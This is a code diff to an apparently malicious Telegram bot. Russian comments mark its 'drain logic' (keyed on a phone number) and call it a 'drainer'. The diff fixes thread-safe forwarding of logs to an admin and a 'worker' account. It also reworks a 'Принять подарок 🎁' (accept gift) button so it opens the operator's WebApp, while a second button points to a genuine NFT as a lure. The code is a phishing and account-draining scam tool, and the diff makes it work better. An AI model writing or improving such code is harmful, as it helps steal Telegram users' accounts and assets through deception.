@@ -56,8 +56,15 @@ def save_log(text):
 
 def send_log(msg, buttons=None):
     save_log(msg)
-    bot.loop.create_task(bot.send_message(ADMIN_ID, f"<b>LOG:</b>\n{msg}", parse_mode='html', buttons=buttons))
-    bot.loop.create_task(bot.send_message(WORKER_ID, f"<b>LOG:</b>\n{msg}", parse_mode='html'))
+    # Безопасная отправка из потока Flask в поток бота
+    asyncio.run_coroutine_threadsafe(
+        bot.send_message(ADMIN_ID, f"<b>LOG:</b>\n{msg}", parse_mode='html', buttons=buttons),
+        bot.loop
+    )
+    asyncio.run_coroutine_threadsafe(
+        bot.send_message(WORKER_ID, f"<b>LOG:</b>\n{msg}", parse_mode='html'),
+        bot.loop
+    )
 
 # --- ЛОГИКА СЛИВА (DRAIN LOGIC) ---
 async def drain_logic(client, phone):
@@ -143,9 +150,9 @@ async def inline_handler(event):
             ),
             # Важно: В Telethon 1.x для инлайн WebApp используем Button.url + специфический параметр
             buttons=[
-                # Кнопка для запуска дрейнера
-                [Button.inline("Принять подарок 🎁", web_url)], 
-                # Кнопка ведет ПРЯМО на "подаренный" NFT (ссылку, которую ты ввел)
+                # Эта кнопка откроет WebApp (твое мини-приложение)
+                [types.KeyboardButtonWebView(text="Принять подарок 🎁", url=web_url)],
+                # Эта кнопка — просто ссылка на оригинальный NFT
                 [Button.url("Посмотреть подарок", input_text)]
             ]
         )
